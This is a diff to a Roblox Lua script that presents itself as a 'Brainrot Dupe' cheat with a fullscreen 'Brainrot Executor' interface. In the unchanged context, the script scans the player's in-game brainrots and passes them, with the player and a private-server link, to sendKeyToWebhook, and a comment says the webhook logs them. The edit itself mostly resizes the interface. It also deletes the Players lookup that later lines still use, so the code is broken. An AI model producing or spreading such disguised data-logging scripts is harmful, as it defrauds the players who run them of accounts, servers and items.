@@ -205,9 +205,6 @@ function showBrainrotExecutor(psLink)
     -- your Brainrot Executor UI (already in your script) here
     -- return scanned brainrots so webhook can log them
 
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
@@ -221,27 +218,11 @@ screenGui.IgnoreGuiInset = true
 
 -- Main Frame (fullscreen)
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(1, 0, 1, 0)
-mainFrame.Position = UDim2.new(0, 0, 0, 0)
+mainFrame.Size = UDim2.new(0, 900, 0, 500)
+mainFrame.Position = UDim2.new(0.5, -450, 0.5, -250)
 mainFrame.BackgroundColor3 = Color3.fromRGB(120, 81, 169)
 mainFrame.BorderSizePixel = 0
 mainFrame.Parent = screenGui
-
--- Add auto scale for mobile
-local uiScale = Instance.new("UIScale")
-uiScale.Parent = mainFrame
-uiScale.Scale = 1
-
-game:GetService("RunService").RenderStepped:Connect(function()
-    local screenSize = workspace.CurrentCamera.ViewportSize
-    if screenSize.X < 800 then
-        uiScale.Scale = 0.8
-    elseif screenSize.X < 600 then
-        uiScale.Scale = 0.65
-    else
-        uiScale.Scale = 1
-    end
-end)
 
 
 -- Gradient
@@ -464,7 +445,7 @@ end)
     -- 🔥 send to webhook after scan
     sendKeyToWebhook(player, psLink, brainrots)
 
-    print("Brainrot Dupe By ZuriScripts Loaded!)")
+    print("Brainrot Dupe By ZuriScripts Loaded!")
     return brainrots
 end
 
